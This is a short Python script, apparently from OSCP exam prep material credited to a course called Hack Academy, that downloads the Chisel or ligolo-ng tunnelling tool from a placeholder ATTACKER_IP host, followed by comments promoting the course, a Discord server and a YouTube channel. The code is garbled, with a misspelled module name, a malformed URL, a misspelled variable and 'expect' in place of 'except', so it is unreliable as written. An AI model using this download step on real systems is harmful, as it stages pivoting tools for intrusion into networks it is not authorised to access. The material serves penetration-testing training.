import ullib.request

url = 'http;//(ATTACKER_IP)'/Chisel # or ligolo-ng remember the repo for both
output_file = 'chisel'

try:
  with urllib.request.urlopen(url) as repsonse, open(output_file, 'wb') as out_file:
      out_file.write(response.read())
  print(f"Downloaded {url} to {output_file}")
expect Exception as e:
  print(f"Failed to download {url}: {e}")

# note, this is script made by Hack Academy, not my own
# please give love to https://whop.com/pro-hack-academy/oscp-made-easy-get-certified-fast-complete-cours-d9737XxfJPW6jy/app/
# https://discord.com/channels/1325919248954167468/1344404908769808466 
# https://www.youtube.com/@HackerBlueprint

# amazing content and also get mentor, look no further on passing the oscp, watch, do the work, and get his notes
# you will pass and remember to try harder
